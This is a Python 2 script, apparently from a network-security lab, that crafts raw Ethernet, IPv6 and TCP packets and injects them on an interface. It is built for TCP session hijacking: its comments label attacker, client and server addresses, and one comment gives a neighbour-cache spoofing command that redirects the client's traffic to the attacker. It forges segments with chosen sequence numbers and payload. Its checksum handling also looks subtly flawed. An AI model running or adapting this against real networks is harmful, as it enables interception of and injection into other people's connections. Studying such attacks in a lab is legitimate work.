import socket
import utils
from fm import *
from tcp_hijack import *

my_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))

def checksum(msg):
	su = 0	

	for i in range (0, len(msg),2):
		
	        w = (ord(msg[i]) << 8) + (ord(msg[i+1]))
		su = su + w

	su = (su >> 16) + (su & 0xffff)

	su = ~su & 0xffff 

	return su
def build_pseudo_header(src_ip, dest_ip, data, upper_layer_packet_length):
        zeros = '000000'
        next_header = "06"
        pseudo_header = src_ip + dest_ip + upper_layer_packet_length + zeros + next_header 
        return pseudo_header

def build_tcp_header(src_port, dest_port, seq_no, ack_no, header_length, ack_flag, syn_flag, fin_flag, push_flag, reset_flag, urg_flag, window_size, urg_pointer, options, src_add_ip, dst_add_ip, data):
	
	tcp_flags = fin_flag + (syn_flag << 1) + (reset_flag << 2) + (push_flag << 3) + (ack_flag << 4) + (urg_flag << 5)
        tcp_flags = '{0:02x}'.format(tcp_flags)
	tcp_checksum = '0000'

        tcp_header = src_port + dest_port + seq_no + ack_no + header_length + str(tcp_flags) + window_size + urg_pointer

	####creating pseudo header####
        pseudo_header = build_pseudo_header(src_add_ip, dst_add_ip, data, str(len(tcp_header) + len(data)))

	if (len(data) % 2 != 0):
		data = data + " "
	
	if (push_flag == 1):
	        pseudo_header = pseudo_header + tcp_header + data
	else:
		pseudo_header = pseudo_header + tcp_header

	tcp_checksum = checksum(pseudo_header)

        if CHECK_SUM != "":
                tcp_checksum = CHECK_SUM
        else:
                tcp_checksum = ih4(tcp_checksum)
        # TCP
        print("\n## BUILDING TCP PACKET SOURCE ")
        print("## Source port       " + src_port)
        print("## Destination port  " + dest_port)
        print("## Sequence number   " + seq_no)
        print("## Acknoledgment     " + ack_no)
        print("## Header length     " + header_length)
        print("## Flags             " + str(tcp_flags))
        print("## Window size       " + window_size)
        print("## Checksum          " + str(tcp_checksum))
        print("## Urgent pointer    " + urg_pointer)
        print("## Options           " + options)
        


        tcp_header = src_port + dest_port + seq_no + ack_no + header_length + str(tcp_flags) + window_size + tcp_checksum + urg_pointer + options
	
	return tcp_header


if __name__ == "__main__":
        # ip attacker 20010000000000000000000000000021
        # ip client   20010000000000000000000000000020
        # ip server   20010000000000000000000000000022

        # mac attacker 000000aa0001
        # mac client   000000aa0000
        # mac server   000000aa0002

        # ip -6 neigh change 2001::20 lladdr 00:00:00:aa:00:01 dev eth0

        # ethernet
        mac_dest = MAC_DESTINO
        mac_src =  MAC_SOURCE
        eth_type = "86dd"
        ethernet_packet = mac_dest + mac_src + eth_type

        # ipv6
        version = "60"
        flow_label = IPV6_FLOW_LABEL
        payload_length = "0020"
        next_header = "06"
        hop_limit = "40"        
        ipv6_src =   IP_SRC
        ipv6_dest  = IP_DEST
        ipv6_packet = version + flow_label + payload_length + next_header + hop_limit + ipv6_src + ipv6_dest

        # tcp
        src_port = SRC_PORT
        dest_port = DEST_PORT
        seq_no = SEQ_NO
        ack_no = ACK_NO
        header_length = "80"
        ack_flag = 0
        syn_flag = 0
        fin_flag = 0
        push_flag = 0
        reset_flag = 0
        urg_flag = 0
        window_size = TCP_WINDOW_SIZE
        urg_pointer = '0000'
        options = OPTIONS
        data = TCP_DATA

        # Ethernet
        print("\n## BUILDING ETHERNET PACKET SOURCE ")
        print("## Src Mac          " + mac_dest)
        print("## Dest Mac         " + mac_src)
        print("## Network Protocol " + eth_type)
        
        # IPV6
        print("\n## BUILDING IPV6 PACKET SOURCE ")
        print("## Version        " + version)
        print("## flow label     " + flow_label)
        print("## Payload length " + payload_length)
        print("## Next header    " + next_header)
        print("## Hop limit      " + hop_limit)
        print("## Src ipv6       " + ipv6_src)
        print("## Dest ipv6      " + ipv6_dest)   


        tcp_packet = build_tcp_header(src_port, dest_port, seq_no, ack_no,header_length, ACK_FLAG, SYN_FLAG, FIN_FLAG, PUSH_FLAG, RST_FLAG, 0, window_size, urg_pointer, options, ipv6_src, ipv6_dest, data)

        packet = ethernet_packet + ipv6_packet + tcp_packet + data

        print packet

        if SEND_PACKET_TO_NETWORK == 1 :
                my_socket.sendto(packet.decode("hex"), ("eth0", 0))
